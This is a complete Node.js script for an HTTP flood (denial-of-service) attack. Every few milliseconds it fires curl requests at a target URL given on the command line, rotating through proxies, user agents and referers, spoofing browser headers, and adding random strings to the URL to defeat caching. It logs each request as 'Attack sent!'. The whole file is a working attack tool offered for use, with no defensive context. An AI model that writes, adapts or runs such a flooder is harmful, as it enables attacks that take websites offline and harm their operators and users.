const fs = require("fs");
var exec =  require('child_process').exec;

const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

var target = process.argv[2];
var defaultTarget = target;
var time = process.argv[3];
var proxyfile = process.argv[4];
var userAgentFile = process.argv[5];
var refererFile = process.argv[6];

const proxies = fs.readFileSync(proxyfile, 'utf-8').replace(/\r/g, '').split('\n');
const userAgents = fs.readFileSync(userAgentFile, 'utf-8').replace(/\r/g, '').split('\n');
const referers = fs.readFileSync(refererFile, 'utf-8').replace(/\r/g, '').split('\n');

setInterval(() => {
  target = defaultTarget.replace(/%RAND%/g, RandomString(RandomInt(9, 23)));
  console.log(`Attack sent! -> ${target}`);
  //for(var i = 0; i < 50; ++i)
    exec(`curl --http2 --connect-timeout 10 --speed-limit 9999 --silent --retry-connrefused --raw --max-filesize 99999 --max-time 900 --keepalive-time 50 --get -L --user-agent "${RandomUserAgent()}" ${RequestHeaders()} -x ${RandomProxy()} ${target}`);
}, 3);

setTimeout(() => process.exit(0), time * 1000);

function RequestHeaders()
{
  return `-H 'Referer: ${RandomReferer()}' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7' -H 'Cache-Control: no-cache' -H 'Pragma: no-cache' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Upgrade-Insecure-Requests: 1' -H 'Connection: keep-alive' -H 'Accept-Charset: utf-8'`;
}

function RandomUserAgent()
{
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function RandomReferer()
{
    return referers[Math.floor(Math.random() * referers.length)];
}

function RandomProxy()
{
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function RandomInt(min, max) {  
  return Math.floor(
    Math.random() * (max - min + 1) + min
  )
}

function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}